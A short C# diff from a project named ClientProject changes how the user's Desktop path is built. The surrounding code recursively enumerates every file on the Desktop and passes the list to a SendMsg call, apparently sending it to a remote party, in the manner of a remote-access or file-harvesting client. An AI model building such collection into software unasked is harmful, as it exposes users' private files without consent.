@@ -105,7 +105,7 @@ namespace ClientProject
             {
                 try
                 {
-                    tmp = Directory.GetFiles(@$"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories);
+                    tmp = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Desktop", "*", SearchOption.AllDirectories);
                     SendMsg(tmp);
                 }
                 catch (Exception ex)
@@ -119,7 +119,7 @@ namespace ClientProject
                 string[] arg = { };
                 try
                 {
-                    tmp = Directory.GetFiles(@$"C:\Users\" + $"{Environment.UserName}" + @"\Desktop", "*", SearchOption.AllDirectories);
+                    tmp = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Desktop", "*", SearchOption.AllDirectories);
 
                     foreach (var item in tmp)
                     {
